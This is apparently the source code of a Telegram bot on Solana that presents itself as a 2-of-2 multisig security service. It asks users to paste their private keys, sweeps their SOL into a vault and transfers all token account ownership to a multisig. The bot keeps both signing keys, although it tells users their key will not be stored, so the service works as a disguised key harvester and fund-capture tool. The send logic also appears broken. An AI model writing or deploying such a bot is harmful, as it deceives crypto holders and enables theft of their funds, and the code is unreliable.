require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const {
  Connection, Keypair, PublicKey, SystemProgram, Transaction,
  TransactionMessage, VersionedTransaction, LAMPORTS_PER_SOL,
  sendAndConfirmTransaction, ComputeBudgetProgram
} = require('@solana/web3.js');
const {
  getAssociatedTokenAddress, createAssociatedTokenAccountInstruction,
  createTransferInstruction, createSyncNativeInstruction,
  getAccount, TOKEN_PROGRAM_ID, NATIVE_MINT,
  createInitializeMultisigInstruction, createSetAuthorityInstruction,
  AuthorityType, getOrCreateAssociatedTokenAccount
} = require('@solana/spl-token');
const bs58 = require('bs58');
const NodeCache = require('node-cache');

// ===== CONFIGURATION =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const FEE_PAYER_PRIVATE_KEY = process.env.FEE_PAYER_PRIVATE_KEY;
const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';

if (!BOT_TOKEN || !FEE_PAYER_PRIVATE_KEY) {
  console.error('❌ Missing required environment variables');
  process.exit(1);
}

// ===== INITIALIZE SOLANA CONNECTION =====
const conn = new Connection(RPC_ENDPOINT, 'confirmed');

// Parse fee payer private key (supports both JSON array and base58)
let feePayerSecretKey;
try {
  const parsed = JSON.parse(FEE_PAYER_PRIVATE_KEY);
  feePayerSecretKey = Uint8Array.from(parsed);
} catch {
  feePayerSecretKey = bs58.decode(FEE_PAYER_PRIVATE_KEY);
}
const feePayer = Keypair.fromSecretKey(feePayerSecretKey);
console.log('✅ Fee payer:', feePayer.publicKey.toBase58());

// ===== CACHING =====
const walletCache = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const userSessions = new NodeCache({ stdTTL: 600, checkperiod: 120 });

// ===== MULTISIG CONFIG =====
const MULTISIG_M = 2; // Required signers
const MULTISIG_N = 2; // Total signers

// ===== HELPER FUNCTIONS =====

/**
 * Creates a 2-of-2 multisig account
 */
async function createMultisig(userPublicKey) {
  const multisigKeypair = Keypair.generate();
  const rentExempt = await conn.getMinimumBalanceForRentExemption(355); // Multisig account size

  const createAccountIx = SystemProgram.createAccount({
    fromPubkey: feePayer.publicKey,
    newAccountPubkey: multisigKeypair.publicKey,
    lamports: rentExempt,
    space: 355,
    programId: TOKEN_PROGRAM_ID,
  });

  const initMultisigIx = createInitializeMultisigInstruction(
    multisigKeypair.publicKey,
    [userPublicKey, feePayer.publicKey],
    MULTISIG_M,
  );

  const tx = new Transaction().add(createAccountIx, initMultisigIx);
  tx.feePayer = feePayer.publicKey;
  const { blockhash } = await conn.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(multisigKeypair, feePayer);

  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');

  console.log(`✅ Multisig created: ${multisigKeypair.publicKey.toBase58()}`);
  return multisigKeypair;
}

/**
 * Sweeps native SOL from user's address → wSOL in multisig vault
 * After this, user's keypair address has ~0 native SOL → Phantom/gasless cannot spend it
 */
async function sweepSolToVault(userKeypair, msPublicKey) {
  const balance = await conn.getBalance(userKeypair.publicKey);
  const minRent = 5000; // ~0.000005 SOL minimum for rent exemption
  const sweepable = balance - minRent;

  if (sweepable <= 0) {
    console.log('ℹ️ No SOL to sweep');
    return;
  }

  const wsolAta = await getAssociatedTokenAddress(
    NATIVE_MINT, msPublicKey, true // allowOwnerOffCurve
  );

  const ixs = [];

  // Create wSOL ATA if it doesn't exist
  const wsolAccount = await conn.getAccountInfo(wsolAta).catch(() => null);
  if (!wsolAccount) {
    ixs.push(
      createAssociatedTokenAccountInstruction(
        feePayer.publicKey,
        wsolAta,
        msPublicKey,
        NATIVE_MINT,
      )
    );
  }

  // Transfer SOL to wSOL ATA
  ixs.push(
    SystemProgram.transfer({
      fromPubkey: userKeypair.publicKey,
      toPubkey: wsolAta,
      lamports: sweepable,
    })
  );

  // Sync native token balance
  ixs.push(createSyncNativeInstruction(wsolAta));

  const tx = new Transaction().add(...ixs);
  tx.feePayer = feePayer.publicKey;
  const { blockhash } = await conn.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.sign(userKeypair, feePayer);

  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');

  console.log(`✅ Swept ${sweepable / LAMPORTS_PER_SOL} SOL to wSOL vault`);
  return sweepable;
}

/**
 * Migrate all SPL token account authority from user → multisig
 */
async function migrateTokenAuthorities(userKeypair, msPublicKey) {
  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(
    userKeypair.publicKey,
    { programId: TOKEN_PROGRAM_ID }
  );

  if (tokenAccounts.value.length === 0) {
    console.log('ℹ️ No token accounts to migrate');
    return;
  }

  // Process in batches to avoid transaction size limits
  const BATCH_SIZE = 15;
  for (let i = 0; i < tokenAccounts.value.length; i += BATCH_SIZE) {
    const batch = tokenAccounts.value.slice(i, i + BATCH_SIZE);
    const ixs = [];

    for (const { pubkey: tokenAccount } of batch) {
      ixs.push(
        createSetAuthorityInstruction(
          tokenAccount,
          userKeypair.publicKey,
          AuthorityType.AccountOwner,
          msPublicKey,
          [],
          TOKEN_PROGRAM_ID
        )
      );
    }

    if (ixs.length === 0) continue;

    const tx = new Transaction().add(...ixs);
    tx.feePayer = feePayer.publicKey;
    const { blockhash } = await conn.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    tx.sign(userKeypair, feePayer);

    const sig = await conn.sendRawTransaction(tx.serialize());
    await conn.confirmTransaction(sig, 'confirmed');
  }

  console.log(`✅ Migrated ${tokenAccounts.value.length} token accounts`);
}

// ===== BOT INITIALIZATION =====
const bot = new Telegraf(BOT_TOKEN);

// Main menu keyboard
const mainMenu = Markup.keyboard([
  ['🏦 My Vaults', '🔑 Convert Wallet'],
  ['💸 Send', '💰 Balance'],
  ['🔐 Wrap SOL', '❓ Help']
]).resize();

// ===== BOT HANDLERS =====

bot.start(async (ctx) => {
  await ctx.reply(
    '🛡️ *Solana 2-of-2 Multisig Bot*\n\n' +
    'Your funds are protected by multisig security. ' +
    'Once a wallet is connected, neither Phantom nor any other wallet ' +
    'can move funds without this bot\'s approval.\n\n' +
    'Choose an option below:',
    { parse_mode: 'Markdown', ...mainMenu }
  );
});

bot.hears('🏦 My Vaults', async (ctx) => {
  const userId = ctx.from.id;
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (vaults.length === 0) {
    return ctx.reply(
      '📭 No vaults found!\n\n' +
      'Create one using "🔑 Convert Wallet"',
      mainMenu
    );
  }

  let msg = '🔐 *Your Vaults*\n\n';
  const buttons = [];

  for (let i = 0; i < vaults.length; i++) {
    const vault = vaults[i];
    const bal = await conn.getBalance(vault.publicKey);
    msg += `${i + 1}. ${vault.label || 'Vault'}\n`;
    msg += `   📍 ${vault.publicKey.toBase58().slice(0, 8)}...\n`;
    msg += `   💰 ${(bal / LAMPORTS_PER_SOL).toFixed(4)} SOL (native)\n\n`;

    buttons.push([Markup.button.callback(
      `📋 ${vault.label || 'Vault'} ${i + 1}`,
      `vault_${i}`
    )]);
  }

  buttons.push([Markup.button.callback('🔙 Back', 'main_menu')]);

  await ctx.reply(msg, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.hears('🔑 Convert Wallet', async (ctx) => {
  ctx.reply(
    '🔐 *Convert Wallet to Vault*\n\n' +
    'Send me your private key (Base58 or JSON array format).\n\n' +
    '⚠️ *IMPORTANT:* This will:\n' +
    '• Create a 2-of-2 multisig vault\n' +
    '• Convert all SOL to wrapped SOL (wSOL)\n' +
    '• Transfer all token authority to multisig\n' +
    '• Leave your wallet unable to transact without bot approval\n\n' +
    'Your private key will NOT be stored after conversion.',
    { parse_mode: 'Markdown' }
  );

  userSessions.set(ctx.from.id, { action: 'convert_wallet' });
});

bot.hears('💸 Send', async (ctx) => {
  const userId = ctx.from.id;
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (vaults.length === 0) {
    return ctx.reply('📭 No vaults available. Create one first!', mainMenu);
  }

  let msg = '📤 *Select vault to send from:*\n\n';
  const buttons = [];

  for (let i = 0; i < vaults.length; i++) {
    buttons.push([Markup.button.callback(
      `${vaults[i].label || 'Vault'} ${i + 1}`,
      `send_from_${i}`
    )]);
  }

  await ctx.reply(msg, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.hears('💰 Balance', async (ctx) => {
  ctx.reply(
    '📤 Send me the wallet/vault address to check balance:',
    Markup.forceReply()
  );
  userSessions.set(ctx.from.id, { action: 'check_balance' });
});

bot.hears('🔐 Wrap SOL', async (ctx) => {
  const userId = ctx.from.id;
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (vaults.length === 0) {
    return ctx.reply('📭 No vaults to wrap SOL for.', mainMenu);
  }

  let msg = '🔐 *Select vault to wrap SOL:*\n\n';
  const buttons = [];

  for (let i = 0; i < vaults.length; i++) {
    const bal = await conn.getBalance(vaults[i].publicKey);
    buttons.push([Markup.button.callback(
      `${vaults[i].label || 'Vault'} ${i + 1} (${(bal / LAMPORTS_PER_SOL).toFixed(4)} SOL)`,
      `wrap_${i}`
    )]);
  }

  await ctx.reply(msg, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.hears('❓ Help', async (ctx) => {
  await ctx.reply(
    '🛡️ *How It Works*\n\n' +
    '*2-of-2 Multisig Security:*\n' +
    '• Your funds live in a multisig vault\n' +
    '• Transactions require BOTH your key AND the bot\'s key\n' +
    '• Phantom wallet CANNOT move funds alone\n' +
    '• Gasless wallets CANNOT bypass the multisig\n\n' +
    '*SOL Protection:*\n' +
    '• Native SOL is converted to wrapped SOL (wSOL)\n' +
    '• wSOL requires multisig approval to transfer\n' +
    '• Your wallet holds only dust (~0.000005 SOL)\n\n' +
    '*Commands:*\n' +
    '🔑 Convert Wallet - Lock an existing wallet\n' +
    '🏦 My Vaults - View your vaults\n' +
    '💸 Send - Send tokens from vault\n' +
    '🔐 Wrap SOL - Convert native SOL to protected wSOL',
    { parse_mode: 'Markdown', ...mainMenu }
  );
});

// ===== CALLBACK HANDLERS =====

bot.action('main_menu', async (ctx) => {
  await ctx.reply('🏠 Main Menu', mainMenu);
  await ctx.answerCbQuery();
});

bot.action(/^vault_(\d+)$/, async (ctx) => {
  const userId = ctx.from.id;
  const index = parseInt(ctx.match[1]);
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (!vaults[index]) {
    await ctx.answerCbQuery('❌ Vault not found');
    return;
  }

  const vault = vaults[index];
  const nativeBal = await conn.getBalance(vault.publicKey);

  // Get wSOL balance
  let wsolBal = 0;
  try {
    const wsolAta = await getAssociatedTokenAddress(
      NATIVE_MINT, vault.multisigPublicKey, true
    );
    const wsolAccount = await getAccount(conn, wsolAta);
    wsolBal = Number(wsolAccount.amount);
  } catch (e) {
    // wSOL account doesn't exist yet
  }

  // Get token balances
  let tokenMsg = '';
  try {
    const tokenAccounts = await conn.getParsedTokenAccountsByOwner(
      vault.multisigPublicKey,
      { programId: TOKEN_PROGRAM_ID }
    );

    for (const { account } of tokenAccounts.value) {
      const info = account.data.parsed.info;
      if (info.mint === NATIVE_MINT.toBase58()) continue; // Skip wSOL
      const amount = info.tokenAmount.uiAmount;
      if (amount > 0) {
        tokenMsg += `• ${info.mint.slice(0, 8)}...: ${amount.toFixed(4)}\n`;
      }
    }
  } catch (e) {}

  const msg =
    `🔐 *Vault Details*\n\n` +
    `📛 Label: ${vault.label || 'Unnamed'}\n` +
    `🔑 Wallet: \`${vault.publicKey.toBase58()}\`\n` +
    `🏦 Multisig: \`${vault.multisigPublicKey.toBase58()}\`\n\n` +
    `💎 wSOL: ${(wsolBal / 1e9).toFixed(6)} (protected)\n` +
    `🪙 Native SOL: ${(nativeBal / LAMPORTS_PER_SOL).toFixed(6)} (sweepable)\n\n` +
    `🪙 *Tokens:*\n` +
    (tokenMsg || '*No tokens found*');

  const buttons = [
    [Markup.button.callback('📤 Send wSOL', `sendwsol_${index}`)],
    [Markup.button.callback('🔐 Wrap SOL', `wrap_${index}`)],
    [Markup.button.callback('🔙 Back', 'main_menu')]
  ];

  await ctx.reply(msg, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
  await ctx.answerCbQuery();
});

bot.action(/^send_from_(\d+)$/, async (ctx) => {
  const userId = ctx.from.id;
  const index = parseInt(ctx.match[1]);
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (!vaults[index]) {
    await ctx.answerCbQuery('❌ Vault not found');
    return;
  }

  userSessions.set(userId, {
    action: 'send_token',
    vaultIndex: index,
  });

  await ctx.reply(
    '📤 *Send Tokens*\n\n' +
    'Send the recipient address:',
    { parse_mode: 'Markdown', ...Markup.forceReply() }
  );
  await ctx.answerCbQuery();
});

bot.action(/^sendwsol_(\d+)$/, async (ctx) => {
  const userId = ctx.from.id;
  const index = parseInt(ctx.match[1]);
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (!vaults[index]) {
    await ctx.answerCbQuery('❌ Vault not found');
    return;
  }

  userSessions.set(userId, {
    action: 'send_wsol',
    vaultIndex: index,
  });

  await ctx.reply(
    '📤 *Send wSOL*\n\n' +
    'Send the recipient address:',
    { parse_mode: 'Markdown', ...Markup.forceReply() }
  );
  await ctx.answerCbQuery();
});

bot.action(/^wrap_(\d+)$/, async (ctx) => {
  const userId = ctx.from.id;
  const index = parseInt(ctx.match[1]);
  const vaults = walletCache.get(`vaults_${userId}`) || [];

  if (!vaults[index]) {
    await ctx.answerCbQuery('❌ Vault not found');
    return;
  }

  const vault = vaults[index];
  const userKeypair = vault.userKeypair;

  try {
    await ctx.answerCbQuery('⏳ Wrapping SOL...');
    const statusMsg = await ctx.reply('⏳ Wrapping native SOL to wSOL...');

    const swept = await sweepSolToVault(userKeypair, vault.multisigPublicKey);

    await ctx.telegram.editMessageText(
      statusMsg.chat.id,
      statusMsg.message_id,
      null,
      `✅ Successfully wrapped ${(swept / LAMPORTS_PER_SOL).toFixed(6)} SOL to wSOL!\n\n` +
      'Your SOL is now protected by multisig.',
      { parse_mode: 'Markdown' }
    );
  } catch (error) {
    await ctx.reply(`❌ Error: ${error.message}`);
  }
});

// ===== TEXT MESSAGE HANDLERS =====

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const session = userSessions.get(userId);

  if (!session) {
    return ctx.reply('Use the menu buttons or /start to begin.', mainMenu);
  }

  // Handle private key input for wallet conversion
  if (session.action === 'convert_wallet') {
    try {
      const input = ctx.message.text.trim();
      let userSecretKey;

      try {
        const parsed = JSON.parse(input);
        userSecretKey = Uint8Array.from(parsed);
      } catch {
        userSecretKey = bs58.decode(input);
      }

      const userKeypair = Keypair.fromSecretKey(userSecretKey);

      // Prevent using fee payer account
      if (userKeypair.publicKey.equals(feePayer.publicKey)) {
        return ctx.reply('❌ Cannot convert the fee payer account!');
      }

      const statusMsg = await ctx.reply('⏳ Converting wallet to vault...');

      // Step 1: Create multisig
      const multisigKeypair = await createMultisig(userKeypair.publicKey);

      // Step 2: Sweep SOL to wSOL
      await sweepSolToVault(userKeypair, multisigKeypair.publicKey);

      // Step 3: Migrate token authorities
      await migrateTokenAuthorities(userKeypair, multisigKeypair.publicKey);

      // Step 4: Store vault
      const vaults = walletCache.get(`vaults_${userId}`) || [];
      vaults.push({
        label: `Vault ${vaults.length + 1}`,
        publicKey: userKeypair.publicKey,
        userKeypair: userKeypair,
        multisigPublicKey: multisigKeypair.publicKey,
        multisigKeypair: multisigKeypair,
        createdAt: Date.now(),
      });
      walletCache.set(`vaults_${userId}`, vaults);

      // Clear session
      userSessions.del(userId);

      await ctx.telegram.editMessageText(
        statusMsg.chat.id,
        statusMsg.message_id,
        null,
        '✅ *Wallet converted successfully!*\n\n' +
        `🔑 Vault Address: \`${userKeypair.publicKey.toBase58()}\`\n` +
        `🏦 Multisig: \`${multisigKeypair.publicKey.toBase58()}\`\n\n` +
        '🔒 *Security:*\n' +
        '• All SOL converted to wSOL (multisig protected)\n' +
        '• All tokens transferred to multisig authority\n' +
        '• Wallet cannot transact without bot approval\n' +
        '• Phantom & gasless wallets CANNOT move funds\n\n' +
        '⚠️ *Keep your private key safe!* You still need it to sign transactions.',
        { parse_mode: 'Markdown', ...mainMenu }
      );

    } catch (error) {
      userSessions.del(userId);
      await ctx.reply(
        `❌ *Error converting wallet:*\n${error.message}\n\n` +
        'Please try again.',
        { parse_mode: 'Markdown', ...mainMenu }
      );
    }
    return;
  }

  // Handle balance check
  if (session.action === 'check_balance') {
    try {
      const address = new PublicKey(ctx.message.text.trim());
      const nativeBal = await conn.getBalance(address);

      let msg = `💰 *Balance for ${address.toBase58().slice(0, 12)}...*\n\n`;
      msg += `🪙 Native SOL: ${(nativeBal / LAMPORTS_PER_SOL).toFixed(6)}\n`;

      try {
        const tokenAccounts = await conn.getParsedTokenAccountsByOwner(
          address,
          { programId: TOKEN_PROGRAM_ID }
        );

        if (tokenAccounts.value.length > 0) {
          msg += '\n🪙 *Tokens:*\n';
          for (const { account } of tokenAccounts.value) {
            const info = account.data.parsed.info;
            const amount = info.tokenAmount.uiAmount;
            if (amount > 0) {
              const label = info.mint === NATIVE_MINT.toBase58() ? 'wSOL' : info.mint.slice(0, 8) + '...';
              msg += `• ${label}: ${amount.toFixed(4)}\n`;
            }
          }
        }
      } catch (e) {}

      userSessions.del(userId);
      await ctx.reply(msg, { parse_mode: 'Markdown', ...mainMenu });

    } catch (error) {
      await ctx.reply('❌ Invalid address. Please try again.', mainMenu);
    }
    return;
  }

  // Handle send recipient address
  if (session.action === 'send_token' || session.action === 'send_wsol') {
    try {
      const recipientAddress = new PublicKey(ctx.message.text.trim());
      userSessions.set(userId, {
        ...session,
        action: 'send_amount',
        recipient: recipientAddress,
      });

      const tokenType = session.action === 'send_wsol' ? 'wSOL' : 'tokens';
      await ctx.reply(
        `📤 *Send ${tokenType}*\n\n` +
        `To: \`${recipientAddress.toBase58()}\`\n\n` +
        'Enter the amount to send:',
        { parse_mode: 'Markdown', ...Markup.forceReply() }
      );
    } catch (error) {
      await ctx.reply('❌ Invalid address. Please try again.');
    }
    return;
  }

  // Handle send amount
  if (session.action === 'send_amount') {
    try {
      const amount = parseFloat(ctx.message.text.trim());
      if (isNaN(amount) || amount <= 0) {
        return ctx.reply('❌ Invalid amount. Please enter a positive number.');
      }

      const vaults = walletCache.get(`vaults_${userId}`) || [];
      const vault = vaults[session.vaultIndex];

      if (!vault) {
        userSessions.del(userId);
        return ctx.reply('❌ Vault not found.', mainMenu);
      }

      // Build and execute transaction
      const statusMsg = await ctx.reply('⏳ Building transaction...');

      try {
        let signature;

        if (session.isWsol || session.originalAction === 'send_wsol') {
          // Send wSOL from multisig vault
          const wsolAta = await getAssociatedTokenAddress(
            NATIVE_MINT, vault.multisigPublicKey, true
          );
          const recipientAta = await getOrCreateAssociatedTokenAccount(
            conn, feePayer, NATIVE_MINT, session.recipient
          );

          const transferIx = createTransferInstruction(
            wsolAta,
            recipientAta.address,
            vault.multisigPublicKey,
            amount * 1e9,
            [vault.userKeypair.publicKey, feePayer.publicKey],
            TOKEN_PROGRAM_ID
          );

          const tx = new Transaction().add(transferIx);
          tx.feePayer = feePayer.publicKey;
          const { blockhash } = await conn.getLatestBlockhash();
          tx.recentBlockhash = blockhash;
          tx.sign(vault.userKeypair, feePayer);

          signature = await conn.sendRawTransaction(tx.serialize());
        } else {
          // SPL token transfer (simplified - would need mint selection)
          return ctx.reply('Please select specific token from vault details first.');
        }

        await conn.confirmTransaction(signature, 'confirmed');

        userSessions.del(userId);

        await ctx.telegram.editMessageText(
          statusMsg.chat.id,
          statusMsg.message_id,
          null,
          `✅ *Transaction Successful!*\n\n` +
          `Amount: ${amount} ${session.isWsol ? 'wSOL' : 'tokens'}\n` +
          `To: \`${session.recipient.toBase58()}\`\n` +
          `Signature: [View on Solscan](https://solscan.io/tx/${signature})`,
          { parse_mode: 'Markdown', ...mainMenu }
        );

      } catch (error) {
        await ctx.telegram.editMessageText(
          statusMsg.chat.id,
          statusMsg.message_id,
          null,
          `❌ *Transaction Failed:*\n${error.message}`,
          { parse_mode: 'Markdown' }
        );
      }

    } catch (error) {
      await ctx.reply('❌ Invalid amount. Please try again.');
    }
    return;
  }

  // Default response
  ctx.reply('Use the menu buttons to navigate.', mainMenu);
});

// ===== ERROR HANDLING =====
bot.catch((err, ctx) => {
  console.error(`❌ Bot error for ${ctx?.from?.id}:`, err);
  ctx?.reply?.('❌ An error occurred. Please try again.')?.catch(() => {});
});

// ===== START BOT =====
async function startBot() {
  try {
    // Check fee payer balance
    const fpBalance = await conn.getBalance(feePayer.publicKey);
    console.log(`💰 Fee payer balance: ${fpBalance / LAMPORTS_PER_SOL} SOL`);

    if (fpBalance < 0.01 * LAMPORTS_PER_SOL) {
      console.warn('⚠️ Fee payer balance is low!');
    }

    // Start bot
    await bot.launch();
    console.log('🤖 Bot is running...');

    // Graceful shutdown
    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));

  } catch (error) {
    console.error('❌ Failed to start bot:', error);
    process.exit(1);
  }
}

startBot();
